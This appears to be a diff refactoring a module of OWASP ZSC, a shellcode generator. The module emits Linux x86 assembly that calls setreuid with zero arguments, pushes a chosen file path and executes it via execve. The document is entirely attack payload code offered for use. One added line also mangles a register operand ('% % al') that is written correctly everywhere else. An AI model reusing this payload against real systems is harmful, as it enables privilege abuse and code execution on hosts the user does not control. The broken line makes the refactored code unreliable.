@@ -1,4 +1,3 @@
-
 """
 OWASP ZSC
 https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
@@ -6,27 +5,28 @@ https://github.com/zscproject/OWASP-ZSC
 http://api.z3r0d4y.com/
 https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
 """
+from new_cores import base_module
 from cores import stack
 from lib.opcoder.linux_x86 import convert
 
 
-def exc(file_to_exec):
-    return '''
-mov    $0x46,%%al
-xor    %%ebx,%%ebx
-xor    %%ecx,%%ecx
-int    $0x80
-%s
-mov    %%esp,%%ebx
-xor    %%eax,%%eax
-mov    $0xb,%%al
-int    $0x80
-mov    $0x1,%%al
-mov    $0x1,%%bl
-int    $0x80
-''' % (file_to_exec)
+class Module(base_module.BaseModule):
+    file_dest = base_module.OptString("", "Destination file")
 
+    def generate(self):
+        payload = "mov    $0x46, % % al\n"
+        payload += "xor    %%ebx,%%ebx\n"
+        payload += "xor    %%ecx,%%ecx\n"
+        payload += "int    $0x80\n"
+        payload += stack.generate(self.file_dest, '%ebx', 'string')
+        payload += "mov    %%esp,%%ebx\n"
+        payload += "xor    %%eax,%%eax\n"
+        payload += "mov    $0xb,%%al\n"
+        payload += "int    $0x80\n"
+        payload += "mov    $0x1,%%al\n"
+        payload += "mov    $0x1,%%bl\n"
+        payload += "int    $0x80"
+        return payload
 
-def run(data):
-    file_to_exec = data[0]
-    return exc(stack.generate(file_to_exec, '%ebx', 'string'))
+    def run(self):
+        print(self.generate())
